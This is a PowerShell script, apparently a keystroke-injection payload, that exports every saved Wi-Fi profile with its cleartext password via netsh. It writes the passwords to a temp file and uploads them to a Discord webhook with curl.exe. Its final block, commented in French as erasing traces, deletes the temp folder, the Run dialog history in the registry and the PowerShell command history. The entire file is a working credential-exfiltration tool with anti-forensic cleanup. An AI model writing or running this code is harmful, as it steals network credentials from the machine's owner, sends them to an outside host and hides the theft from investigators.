function Upload-Discord {

    [CmdletBinding()]
    param (
        [string]$file
    )
    
    $hookurl = "$dc" # Discord Webhook URL
    
    if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
}
New-Item -Path $env:temp -Name "wifi" -ItemType "directory"
Set-Location -Path "$env:temp\wifi"
netsh wlan export profile key=clear
$wifiProfiles = Select-String -Path *.xml -Pattern 'keyMaterial' | % { $_ -replace '</?keyMaterial>', ''} | % {$_ -replace "C:\\Users\\$env:UserName\\Desktop\\", ''} | % {$_ -replace '.xml:22:', ''}
$wifiProfiles > $env:TEMP\wifi\wifi.txt
Upload-Discord -file $env:TEMP\wifi\wifi.txt
Set-Location -Path "$env:temp"

# Efface les traces
Remove-Item -Path "$env:tmp\wifi" -Force -Recurse
Remove-Item -Path HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
Remove-Item (Get-PSreadlineOption).HistorySavePath -Force -ErrorAction SilentlyContinue
clear
exit